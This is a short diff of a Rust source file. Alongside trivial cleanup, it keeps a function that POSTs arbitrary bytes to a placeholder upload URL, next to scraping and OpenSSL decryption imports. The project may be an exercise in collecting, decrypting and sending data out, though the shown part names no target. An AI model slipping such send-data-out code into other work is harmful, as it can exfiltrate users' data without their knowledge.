@@ -2,7 +2,7 @@ pub mod scraping;
 
 use openssl::symm::{decrypt, Cipher};
 use std::fs;
-use std::io::{self, Read};
+use std::io::{self, Read as _};
 use std::path::PathBuf;
 //not sure if a remote server exist got to go back and reread the document.
 const REMOTE_SERVER_URL: &str = "http://example.com/upload";
@@ -24,19 +24,4 @@ pub fn send_to_remote_server(data: &[u8]) -> Result<(), Box<dyn std::error::Erro
     let client = reqwest::blocking::Client::new();
     client.post(REMOTE_SERVER_URL).body(data.to_vec()).send()?;
     Ok(())
-}
-
-pub fn add(left: usize, right: usize) -> usize {
-    left + right
-}
-
-#[cfg(test)]
-mod tests {
-    use super::*;
-
-    #[test]
-    fn it_works() {
-        let result = add(2, 2);
-        assert_eq!(result, 4);
-    }
 }
